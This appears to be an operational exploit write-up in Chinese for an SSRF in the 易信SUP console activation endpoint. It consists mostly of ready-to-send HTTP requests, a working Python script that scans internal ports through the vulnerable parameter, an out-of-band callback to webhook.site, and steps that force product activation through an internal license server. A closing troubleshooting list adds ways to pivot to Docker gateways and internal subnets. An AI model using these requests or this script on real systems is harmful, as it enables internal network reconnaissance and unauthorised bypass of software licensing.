# 易信SUP /api/console/Activate/GoSystem auth_server SSRF → 内网授权服务器激活

> 适用版本：**1.0.43 / 1.0.44**。传参口径不同，先判定再用：
> - **1.0.43 只读 URL query**，body 传参恒回 `{"code":1,"message":"请输入授权码"}`
> - **1.0.44 只读 JSON body**
> 同主机不同端口的键/口径不能照搬。

## 指纹/前置判定
```
POST /api/console/Activate/GetStatus HTTP/1.1
Content-Type: application/json

{}
# 未激活: {"code":0,"data":{"activated":false,"locked":true,...}}

POST /api/console/Login/InitConfig HTTP/1.1
Content-Type: application/json

{}
# 未激活: 403 "系统未授权"
```
已 activated=true/locked=true 的实例也能用本 SSRF 做出站验证与内网盲探（只是 GetStatus 不会再翻成 locked=false）。

## 传参口径（1.0.43 vs 1.0.44）
```
# 1.0.43（8080）：只认 query
POST /api/console/Activate/GoSystem?license_key=YS-M85X-QC85-RQV5-RJQ8&auth_server=http://127.0.0.1:8090 HTTP/1.1
Host: <target>:8080
Content-Type: application/json
# -> {"code":1,"data":null,"message":"当前域名 <域名> 不在该授权的许可范围内，请使用「自助改绑」更换域名或联系客服"}

# 1.0.43 把同样参数放 body -> 被忽略
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"http://127.0.0.1:8090"}
# -> {"code":1,"data":null,"message":"请输入授权码"}

# 1.0.44（8081）：只认 body
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"https://webhook.site/<token>"}
```

## 出站验证（webhook.site 接收端）
服务端实际发出：
```
POST /auth/activate  UA: Go-http-client/2.0
{"domain":"","ip":"","license_key":"...","machine_code":"<16hex>","version":"1.0.44"}
```
接口侧回：`{"code":1,"data":null,"message":"响应解析失败"}`（因为 mock 回的 JSON 不符合签名格式）。

## 端口盲探判据（关键）
```
auth_server=http://127.0.0.1:1    -> {"code":1,"message":"连接授权服务器失败，请检查网络后重试"}
auth_server=http://127.0.0.1:8080 -> {"code":1,"message":"响应解析失败"}
```
即：连接失败 = 端口/服务不可达；响应解析失败 = TCP 已连通只是内容不对（OPEN）。

## portprobe.py（实测原样）
```python
import requests, time, sys, json
S = requests.Session(); S.trust_env = False
TGT = "http://<target>:8081/api/console/Activate/GoSystem"
KEY = "YS-M85X-QC85-RQV5-RJQ8"
ports = [80,443,3000,3300,3006,3306,4000,5000,5001,5432,5555,6379,7000,7001,7070,
8000,8001,8010,8020,8030,8040,8050,8060,8070,8080,8081,8082,8083,8084,8085,8090,
8100,8140,8181,8200,8300,8443,8500,8888,9000,9001,9090,9100,9200,9300,9443,10000,11211,15672,27017,2375,2376,5601]
def probe(p):
    try:
        r = S.post(TGT, json={"license_key":KEY,"auth_server":"http://127.0.0.1:%d"%p}, timeout=6)
        t = r.text.strip()
        try: m = json.loads(t).get("message","")
        except Exception: m = t[:80]
        if "连接授权服务器失败" in m: return "CLOSED"
        return "OPEN|"+m[:120]
    except Exception as e:
        return "EXC|"+str(e)[:60]
out=[]
for p in ports:
    r = probe(p)
    print("%5d %s"%(p,r), flush=True)
    if not r.startswith("CLOSED") and not r.startswith("EXC"):
        out.append((p,r))
    time.sleep(0.05)
print("=== OPEN:", out)
```
1.0.43 需把 `S.post(TGT, json=...)` 换成 query 形式，例如：
```python
r = S.post(TGT, params={"license_key":KEY,"auth_server":"http://127.0.0.1:%d"%p}, timeout=6)
```
实测输出：80/8080/8081/8888 为 OPEN（非授权服务），**8090 为 OPEN|ok**（内置授权服务器，验签通过）。

## 激活
```
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"http://127.0.0.1:8090"}
```
返回 `{"code":1,...,"message":"当前域名 <域名> 不在该授权的许可范围内，请使用「自助改绑」更换域名或联系客服"}` —— 这只是域名绑定告警，签名已通过。

## 验收
```
POST /api/console/Activate/GetStatus
{}
-> {"code":0,"data":{"activated":true,"days_left":319,"expire_at":1821489306,"license_key":"...","locked":false,"machine_code":"...","plan":"standard","status":1}}

POST /api/console/Login/InitConfig
{}
-> 200 {"code":0,"data":{"database_version":"8.0.28","version":"1.0.44","name":"??Sup"}}
```

## 常见失败原因
- 回「请输入授权码」：参数放错位置 —— 1.0.43 只读 query、1.0.44 只读 body。
- 所有端口都 CLOSED：目标在容器内，127.0.0.1 与业务不在同一网络命名空间 —— 改试 host.docker.internal / docker0 网关 / 目标内网 IP。
- 只有 8080/8081 等自家端口 OPEN：授权服务器可能不在本机，探内网网段（10/172/192.168）。
- license_key 被前端格式校验卡住：从控制台登录页 JS 里扒正则，或复用已知有效格式。
- 激活成功后仍 403：检查是否被域名绑定限制，走「自助改绑」或在 GetStatus 里确认 locked=false。
- 目标本已 activated=true：GetStatus 不会再跳到 locked=false，只据 GoSystem 回文判定 SSRF 是否成立。